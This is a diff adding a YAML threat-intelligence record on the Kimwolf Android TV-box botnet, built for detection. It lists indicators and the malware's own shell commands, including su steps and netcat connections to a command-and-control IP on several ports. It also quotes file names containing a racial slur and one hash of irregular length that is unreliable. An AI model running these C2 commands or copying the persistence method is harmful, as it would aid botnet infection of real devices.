@@ -1,0 +1,85 @@
+description: Kimwolf, a massive Android botnet targeting TV boxes and other devices,
+  uses complex communication protocols and evasion techniques.
+attribution: Aisuru group
+malware_families:
+- Kimwolf
+- KimWolf
+TTPs:
+  processes:
+  - netd_services
+  - tv_helper
+  - cmd.exe
+  - powershell.exe
+  - netd_service
+  commandline:
+  - su\ncd /data/data/com.plln2.systemservice/files\n./niggakernel persisted\nexit
+  - su
+  - toybox nc 93.95.112.59 8082 || busybox nc 93.95.112.59 8082 || busybox1.11 nc
+    93.95.112.59 8082 || busyboxl nc 93.95.112.59 8082
+  - toybox nc 93.95.112.59 1003 || busybox nc 93.95.112.59 1003 || busybox1.11 nc
+    93.95.112.59 1003 || busyboxl nc 93.95.112.59 1003
+  - toybox nc 93.95.112.59 5099 || busybox nc 93.95.112.59 5099 || busybox1.11 nc
+    93.95.112.59 5099 || busyboxl nc 93.95.112.59 5099
+  - toybox nc 93.95.112.59 3582 || busybox nc 93.95.112.59 3582
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - Bot ---> C2, MsgType=0
+  - C2 ---> Bot, MsgType=1
+  - Bot -> C2, MsgType=2
+  - proxy-sdk.14emeliaterracewestroxburyma02132.su:443
+  - sdk-bright.14emeliaterracewestroxburyma02132.su:443
+  - netd_service, 93.95.112.59, 8082
+  - netd_service, 93.95.112.59, 1003
+  - netd_service, 93.95.112.59, 5099
+  - netd_service, 93.95.112.59, 3582
+  file_activity:
+  - /lib/armeabi-v7a/libdevice.so
+  - /data/data/com.plln2.systemservice/files/niggakernel
+  - /data/app/com.n2.systemservice061-NggPTS7BzoFpPmaWNUKwSg==/11ib/arm/libdevice.so
+  - /data/local/tmp/meow217
+  - $SAVE_DIR/mreo31.apk
+  - $SAVE_DIR/mreo31
+  - $SAVE_DIR/mreo32
+  persistence:
+  - Uses Unix domain socket for single instance control
+  - BootReceiver onReceive method sets niggakernel executable and runs it at boot
+  process_relations: []
+IOCs:
+  hashes:
+  - 3e1377869bd6e80e005b71b9e991c060
+  - b688c22aabcd83138bba4afb9b3ef4fc
+  - 887747dc1687953902488489b805d965
+  - 726557aaebee929541f9c60ec86d356ebf06
+  - b1d4739d692d70c3e715f742ac329b05
+  ip_addresses:
+  - 44.7.0.45
+  - 136.243.146.140
+  - 93.95.112.50
+  - 93.95.112.51
+  - 93.95.112.52
+  - 93.95.112.53
+  - 93.95.112.54
+  - 93.95.112.55
+  - 93.95.112.59
+  domains:
+  - pproxy1[.]fun
+  - rtrdedge1.samsungcdn[.]cloud
+  - pawsatyou.eth
+  - 14emeliaterracewestroxburyma02132.su
+  - proxy-sdk.14emeliaterracewestroxburyma02132.su
+  - sdk-bright.14emeliaterracewestroxburyma02132.su
+  - rtrdedge1.samsungcdn.cloud
+  - staging.pproxyl.fun
+  urls: []
+authors:
+- Wang Hao
+- Alex Turing
+- rootkiter
+- Acey9
+reference: https://blog.xlab.qianxin.com/kimwolf-botnet-en/
+date_of_publication: December 17, 2025
+file_creation_date: December 19, 2025
